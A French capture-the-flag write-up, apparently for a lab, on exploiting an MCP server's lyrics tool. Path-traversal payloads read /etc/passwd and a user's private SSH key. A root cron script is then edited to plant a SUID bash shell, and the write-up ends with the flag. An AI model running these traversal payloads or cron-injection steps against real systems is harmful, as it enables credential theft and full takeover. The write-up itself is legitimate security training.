# Disco Maghreb - Paroldle

## Write-up

Dernier acte de notre visite chez **Disco Maghreb**. Cette fois, le serveur MCP propose un outil qui permet de récupérer les paroles de chansons de Raï.
Mais en fouillant un peu, on découvre que le service est vulnérable à une **LFI (Local File Inclusion)**. En exploitant cette faille, il est possible de récupérer une clé privée SSH, se connecter en tant que l'utilisateur **boualem**, et finalement escalader jusqu'à **root** via une tâche cron mal configurée.

---

### 1. Reconnaissance

Le serveur expose un tool :

```json
{
  "name": "get_lyrics",
  "description": "Get lyrics of your favourite rai song",
  "parameters": {
    "song_title": "str"
  }
}
```

En testant quelques valeurs simples (`"didi.txt"`, `"test"`) et grâce aux messages d'erreur, on comprend que le programme lit les paroles dans des fichiers.

---

### 2. Exploitation de la LFI

On tente différents fichiers système classiques :

- `../../etc/passwd` : on obtient le contenu de `/etc/passwd`.
    Cela confirme la vulnérabilité et nous permet de voir qu'il y a un utilisateur sur la machine: [`boualem`](https://www.jeuneafrique.com/1378776/culture/algerie-boualem-disco-maghreb-memoire-vivante-du-rai/).

Puis, sachant qu'un service SSH tourne sur la machine, on se demande si un utilisateur dispose de clés dans son répertoire `~/.ssh`.

- `../../home/boualem/.ssh/authorized_keys`: le fichier existe et contient une clé publique.
- `../../home/boualem/.ssh/id_rsa`: on récupère la **clé privée RSA** de l'utilisateur boualem, correspondante à la clé publique du fichier `authorized_keys`.

On sauvegarde la clé localement :

```bash
chmod 600 private_key
ssh -i private_key boualem@127.0.0.1
```

Nous sommes maintenant connectés sur la machine en tant que `boualem` !

---

### 3. Escalade de privilèges via cron

En fouillant, on repère dans `/etc/cron.d/health-check-disco-maghreb` une tâche exécutée chaque minute par root :

```
* * * * * /usr/local/bin/python3 /app/health-check-disco-maghreb.py >> /var/log/health-check-disco-maghreb.log 2>&1
```

Le script `/app/health-check-disco-maghreb.py` est écrivable par `boualem` :

```
-rw-rw-r-- 1 boualem boualem 334 Aug 28 14:22 health-check-disco-maghreb.py
```

Cela signifie que nous pouvons modifier ce script et injecter du code Python qui sera exécuté automatiquement par root à la prochaine minute.

---

### 4. Exploitation du cron

On édite le script et on ajoute par exemple :

```python
import os
os.system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash")
```

Au bout d'une minute, le cron s'exécute et crée un binaire SUID root.
Il suffit ensuite de lancer :

```bash
/tmp/bash -p
```

Et nous voilà **root** sur la machine. On peut ensuite lire le flag dans `/flag.txt` !

## Flag

`flag-d1sc0_m4ghreb_f0r3v3r-5k2TT5iz`
